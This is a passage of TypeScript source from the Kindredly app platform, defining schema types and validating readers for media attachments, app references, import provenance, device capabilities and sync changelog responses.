  if (schemaUrl) return schemaUrl;

  const sourceInfo = asLookupRecord(source?.sourceInfo || source?.details?.sourceInfo);
  const legacyEbook = asLookupRecord(sourceInfo?.ebook);
  return normalizeEbookUrl(legacyEbook?.downloadUrl) || null;
}

export function getMediaRefSchemaV1(source: {
  info?: ItemDetailsInfo | null;
  details?: { info?: ItemDetailsInfo | null } | null;
} | null | undefined): MediaRefSchemaV1 | null {
  const raw =
    source?.info?.schemas?.[MEDIA_REF_SCHEMA_ID] ||
    source?.details?.info?.schemas?.[MEDIA_REF_SCHEMA_ID];

  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return null;

  const schema = raw as Partial<MediaRefSchemaV1>;
  if (schema.schemaVersion !== 1) return null;

  const attachmentId = normalizeMediaRefString(schema.attachmentId);
  if (!attachmentId) return null;

  const kind = schema.kind;
  if (kind !== 'image' && kind !== 'video' && kind !== 'file') return null;

  return {
    schemaVersion: 1,
    attachmentId,
    kind,
    mimeType: normalizeMediaRefString(schema.mimeType),
    previewAttachmentId: normalizeMediaRefString(schema.previewAttachmentId),
  };
}

function getAttachmentEntries(source: {
  attachments?: { entries?: ItemAttachment[] | null } | null;
  details?: { attachments?: { entries?: ItemAttachment[] | null } | null } | null;
} | null | undefined): ItemAttachment[] {
  const entries = source?.attachments?.entries || source?.details?.attachments?.entries;
  return Array.isArray(entries) ? entries : [];
}

export function getAttachmentById(
  source: {
    attachments?: { entries?: ItemAttachment[] | null } | null;
    details?: { attachments?: { entries?: ItemAttachment[] | null } | null } | null;
  } | null | undefined,
  attachmentId: string | null | undefined,
): ItemAttachment | null {
  const normalizedAttachmentId = normalizeMediaRefString(attachmentId);
  if (!normalizedAttachmentId) return null;

  return getAttachmentEntries(source).find((attachment) => attachment?.id === normalizedAttachmentId) || null;
}

export function getPrimaryMediaAttachment(source: {
  info?: ItemDetailsInfo | null;
  attachments?: { entries?: ItemAttachment[] | null } | null;
  details?: {
    info?: ItemDetailsInfo | null;
    attachments?: { entries?: ItemAttachment[] | null } | null;
  } | null;
} | null | undefined): ItemAttachment | null {
  const mediaRef = getMediaRefSchemaV1(source);
  if (!mediaRef) return null;

  return getAttachmentById(source, mediaRef.attachmentId);
}

export const KINDREDLY_APP_REF_SCHEMA_ID = 'kindredly.appRef.v1';

// `sourceKind` selects the app's runtime — this is the extension point for the different
// Kindredly-app kinds: 'item'/'published' host app behavior via /item/run/<id> (JS code /
// attachments driven by DB content); 'path' points at a same-origin standalone runtime
// (e.g. /app-runtime/<slug>/) embedded directly via iframe. Future DB-rendered app kinds add
// another value here without changing the directory or the outer launch flow.
export type KindredlyAppSourceKind = 'item' | 'published' | 'path';
export type KindredlyAppOpenMode = 'website' | 'embedded' | 'either';
export type KindredlyAppRole = 'firstParty' | 'userHosted';

export interface KindredlyAppRefV1 {
  runtime: 'hosted';
  sourceKind: KindredlyAppSourceKind;
  // For 'item'/'published': the item id / publishId. For 'path': a safe same-origin path.
  sourceId: string;
  preferredOpenMode?: KindredlyAppOpenMode | null;
  launchPath?: string | null;
  appRole?: KindredlyAppRole | null;
  // Presentation for catalog/directory tiles.
  icon?: string | null;
  accent?: string | null;
  eyebrow?: string | null;
  // Some app runtimes ship only in the webapp build (heavy render deps excluded from ext/mobile).
  webappOnly?: boolean | null;
}

function normalizeKindredlyAppString(value: unknown): string | null {
  if (typeof value !== 'string') return null;
  const trimmed = value.trim();
  return trimmed || null;
}

// A `path`-mode app must resolve to a same-origin, absolute path — never a cross-origin,
// protocol-relative, or scheme URL. Re-validated on every read so a tampered value falls out.
export function isSafeSameOriginAppPath(value: unknown): value is string {
  if (typeof value !== 'string') return false;
  const path = value.trim();
  if (!path.startsWith('/')) return false; // absolute, same-origin path only
  if (path.startsWith('//')) return false; // reject protocol-relative "//host"
  if (path.includes('\\')) return false; // reject backslash tricks
  if (/[\x00-\x20]/.test(path)) return false; // no whitespace or control chars
  return true;
}

export function getKindredlyAppRef(source: {
  info?: ItemDetailsInfo | null;
  details?: { info?: ItemDetailsInfo | null } | null;
} | null | undefined): KindredlyAppRefV1 | null {
  const raw =
    source?.info?.schemas?.[KINDREDLY_APP_REF_SCHEMA_ID] ||
    source?.details?.info?.schemas?.[KINDREDLY_APP_REF_SCHEMA_ID];

  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return null;

  const schema = raw as Partial<KindredlyAppRefV1>;
  if (schema.runtime != null && schema.runtime !== 'hosted') return null;

  const sourceKind = schema.sourceKind;
  if (sourceKind !== 'item' && sourceKind !== 'published' && sourceKind !== 'path') return null;

  const sourceId = normalizeKindredlyAppString(schema.sourceId);
  if (!sourceId) return null;

  // Path-mode source ids must pass the same-origin guard, or the ref is treated as absent.
  if (sourceKind === 'path' && !isSafeSameOriginAppPath(sourceId)) return null;

  const preferredOpenMode =
    schema.preferredOpenMode === 'website' ||
    schema.preferredOpenMode === 'embedded' ||
    schema.preferredOpenMode === 'either'
      ? schema.preferredOpenMode
      : undefined;

  const appRole =
    schema.appRole === 'firstParty' || schema.appRole === 'userHosted'
      ? schema.appRole
      : undefined;

  return {
    runtime: 'hosted',
    sourceKind,
    sourceId,
    preferredOpenMode,
    launchPath: normalizeKindredlyAppString(schema.launchPath),
    appRole,
    icon: normalizeKindredlyAppString(schema.icon),
    accent: normalizeKindredlyAppString(schema.accent),
    eyebrow: normalizeKindredlyAppString(schema.eyebrow),
    webappOnly: schema.webappOnly === true ? true : undefined,
  };
}

// Build-time metadata for user/AI-built apps (app class + theme chosen in the
// App Creator). Deliberately a SIBLING of kindredly.appRef.v1, not part of it:
// appRef is strictly validated and gates launching, while this schema only
// tunes the AI builder's guidance — a malformed value must never break launch,
// so the reader is tolerant and returns null instead of throwing.
export const KINDREDLY_APP_BUILD_SCHEMA_ID = 'kindredly.appBuild.v1';

// Where an imported app's code came from. Recorded so "Update from Git" can re-run the exact
// import, and so a reader can audit what was pulled in. Lives on appBuild (tolerant) rather than
// appRef (strict) on purpose: corrupt provenance must degrade the update button, never the launch.
export interface KindredlyAppImportSource {
  repoUrl: string;
  ref: string;
  commitSha: string;
  importedAt: number;
  entry?: string;
  // Resolved CDN modules at import time — the supply-chain record for this bundle.
  deps?: { specifier: string; url: string; bytes: number; sha256: string }[];
}

export interface KindredlyAppBuildV1 {
  // App class id from the client's appManual registry (e.g. 'game', 'tool').
  appClass: string;
  theme?: string | null;
  scaffoldVersion?: number | null;
  importedFrom?: KindredlyAppImportSource | null;
  // Capabilities the repo's kindredly.app.json declared. Authoritative for imported apps: the
  // source scan cannot see through a bundle that aliases `kindredly.location`, and letting the
  // scan win would strip the declaration and break the app with E_CAPABILITY_NOT_DECLARED.
  importedCapabilities?: AppCapabilityId[] | null;
}

function normalizeImportSource(raw: unknown): KindredlyAppImportSource | null {
  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return null;
  const source = raw as Partial<KindredlyAppImportSource>;
  const repoUrl = normalizeKindredlyAppString(source.repoUrl);
  const commitSha = normalizeKindredlyAppString(source.commitSha);
  if (!repoUrl || !commitSha) return null;

  return {
    repoUrl,
    ref: normalizeKindredlyAppString(source.ref) || 'main',
    commitSha,
    importedAt: typeof source.importedAt === 'number' ? source.importedAt : 0,
    ...(normalizeKindredlyAppString(source.entry) ? { entry: normalizeKindredlyAppString(source.entry)! } : {}),
    ...(Array.isArray(source.deps) ? { deps: source.deps.filter((d) => d && typeof d === 'object') } : {}),
  };
}

export function getKindredlyAppBuild(source: {
  info?: ItemDetailsInfo | null;
  details?: { info?: ItemDetailsInfo | null } | null;
} | null | undefined): KindredlyAppBuildV1 | null {
  const raw =
    source?.info?.schemas?.[KINDREDLY_APP_BUILD_SCHEMA_ID] ||
    source?.details?.info?.schemas?.[KINDREDLY_APP_BUILD_SCHEMA_ID];

  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return null;

  const schema = raw as Partial<KindredlyAppBuildV1>;
  const appClass = normalizeKindredlyAppString(schema.appClass);
  if (!appClass) return null;

  const importedFrom = normalizeImportSource(schema.importedFrom);
  const importedCapabilities = Array.isArray(schema.importedCapabilities)
    ? schema.importedCapabilities.filter(isAppCapabilityId)
    : null;

  return {
    appClass,
    theme: normalizeKindredlyAppString(schema.theme),
    scaffoldVersion: typeof schema.scaffoldVersion === 'number' ? schema.scaffoldVersion : undefined,
    ...(importedFrom ? { importedFrom } : {}),
    ...(importedCapabilities && importedCapabilities.length ? { importedCapabilities } : {}),
  };
}

/** True when this app's code came from a repo — the App Builder must not offer to edit it. */
export function isImportedApp(source: {
  info?: ItemDetailsInfo | null;
  details?: { info?: ItemDetailsInfo | null } | null;
} | null | undefined): boolean {
  return !!getKindredlyAppBuild(source)?.importedFrom;
}

// Device-capability declaration for sandboxed apps. A SIBLING of appRef/appBuild for the same
// reason appBuild is: App-Builder apps carry no appRef, and a malformed declaration must never
// break launch. The declaration is disclosure that gates prompting — the grant flow (guardian
// approval for restricted users) is the actual boundary. An app calling a capability it has not
// declared is refused by the host regardless of grants.
export const KINDREDLY_APP_CAPABILITIES_SCHEMA_ID = 'kindredly.appCapabilities.v1';

export const KINDREDLY_APP_CAPABILITY_IDS = ['location', 'capture.photo'] as const;
export type AppCapabilityId = (typeof KINDREDLY_APP_CAPABILITY_IDS)[number];

export interface KindredlyAppCapabilitiesV1 {
  capabilities: AppCapabilityId[];
  // Author-supplied purpose strings, shown in grant prompts and capability chips.
  reasons?: Partial<Record<AppCapabilityId, string>>;
}

export function isAppCapabilityId(value: unknown): value is AppCapabilityId {
  return (KINDREDLY_APP_CAPABILITY_IDS as readonly string[]).includes(value as string);
}

export function getKindredlyAppCapabilities(source: {
  info?: ItemDetailsInfo | null;
  details?: { info?: ItemDetailsInfo | null } | null;
} | null | undefined): KindredlyAppCapabilitiesV1 | null {
  const raw =
    source?.info?.schemas?.[KINDREDLY_APP_CAPABILITIES_SCHEMA_ID] ||
    source?.details?.info?.schemas?.[KINDREDLY_APP_CAPABILITIES_SCHEMA_ID];

  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return null;

  const schema = raw as Partial<KindredlyAppCapabilitiesV1>;
  if (!Array.isArray(schema.capabilities)) return null;

  // Unknown ids are filtered, not fatal: an older client reading a newer declaration keeps the
  // capabilities it understands and refuses the rest by never seeing them declared.
  const capabilities = Array.from(new Set(schema.capabilities.filter(isAppCapabilityId)));
  if (!capabilities.length) return null;

  let reasons: Partial<Record<AppCapabilityId, string>> | undefined;
  if (schema.reasons && typeof schema.reasons === 'object' && !Array.isArray(schema.reasons)) {
    for (const id of capabilities) {
      const reason = normalizeKindredlyAppString((schema.reasons as Record<string, unknown>)[id]);
      if (reason) {
        reasons = reasons || {};
        reasons[id] = reason;
      }
    }
  }

  return { capabilities, reasons };
}


export interface ItemRelationView {
  _id?: string;
  collectionId?: string | null;
  order?: number | null;
  createdAt?: DateString;
  details?: { name?: string; description?: string; comment?: string } | null;
  publishedUpdatedAt?: DateString;
  userId?: string | null;
  encrypted?: boolean;
  encInfo?: EncInfo | null;
}

export interface PermissionView{
    userId: string;
    permission: PermissionType;
    sharedByUserId?: string;
    createdAt?: DateString;
  }

export interface ItemInfoView {
  itemId: string;
  details: Item;
  feedback?: ItemFeedbackView;
  /** Single relation context (e.g., when viewing item within a specific collection) */
  collectionRelation?: ItemRelationView;
  /** Full relation data for all parent collections. Use this as source of truth. */
  collectionRelations?: ItemRelationView[];
  /** 
   * @deprecated Use collectionRelations instead. This field will be removed in a future version.
   * Array of parent collection IDs (derived from collectionRelations for backwards compatibility)
   */
  collectionIds?: string[];
  permissions?: Array<PermissionView>;
  pathItems?: Item[];
}

export interface ItemInfoViewWithSearchFields extends ItemInfoView {
  sortTime?: number;
  scoreInfo?: Record<string, any>;
  permission?: PermissionType;
  permissionUserId?: string;
  parentList?: { name: string; _id: string; imageFilename?: string }[];
  matchType?: 'similar' | 'exact' | 'linked'
}

export interface ItemSysInfo {
  v?: number;
  hasFeeds?: boolean;
  updatedAt?: Date;
}

export interface ItemChangeLogUpdate {
  fullReset: boolean;
  totalUpdates: number;
  updatedItems: ItemInfoView[];
  removedItemIds: string[];
  // Chunked full sync: when the client sends chunked=true and a full reset is
  // needed, the server returns ONLY the library item ids here (updatedItems
  // stays empty). The client then fetches details in pages via fetchItemIds.
  // Keeps huge libraries from being serialized into one giant response.
  chunkedItemIds?: string[];
  // SYNC-4. The changelog cursor to send back as `lastRevision` next time: this
  // user's highest changelog id, captured BEFORE the read that produced this
  // response. Anything written during the read therefore comes again next time
  // rather than being skipped -- the same at-least-once semantics the date cursor
  // had, but exact instead of dependent on two machines' clocks agreeing.
  // Absent on `fetchItemIds` page responses, which do not advance any cursor.
  revision?: number;
  // SYNC-9. Why the server decided a full reset was needed, when it decided rather
  // than the client. Recorded through the client's existing full-reset event path so
  // the reason shows up in the log instead of an unexplained reset.
  fullResetReason?: string;
}

export interface ResourceFetchInfoResponse {
  rtype: ItemResourceType;
  meta: any;
  contentInfo?: ActivityContentInfo;
  itemMatches?: MatchResult[];
  matchItems?: MatchResult[];
}

export interface ItemTemp {
  idx: number;
  type?: ItemTypePrimary | ItemTypeSecondary;
  name?: string;
  description?: string;
  textContent?: string;
  availableDate?: string;
  remark?: string;
  rssURL?: string;
  url?: string;
  files?: any[];
  bannerQuery?: string;
  meta?: ItemMeta;
  sourceInfo?: Record<string, any>;
  tags?: string[];
  /** Canonical gen_* category ids, carried through to the saved item. */
  categories?: string[];
  /** Prefixed useCriteria tags (eduval_/minage_/ta_/cost_/…), carried through to the saved item. */
  useCriteria?: string[];
  editMode?: boolean;
}

/** Options for metadata fetching operations */
export interface FetchMetadataOptions {
  /** Don't fetch/process banner image */
  skipBanner?: boolean;
  /** Bypass cache */
  force?: boolean;
}

/** Result from metadata fetching - structured for clean error handling */
export interface FetchMetadataResult {
  /** Whether the fetch succeeded */
  success: boolean;
  /** The fetched metadata (null if failed) */
  meta: ItemMeta | null;
  /** Derived item subType based on pageType (e.g. 'yt_video', 'yt_channel', 'website') */
  subType: ItemTypeSecondary | null;
  /** Base64 banner image (null if skipBanner or failed) */
  image: string | null;
  /** Original image source URL */
  imageSrc: string | null;
  /** Error message if failed */
  error?: string;
}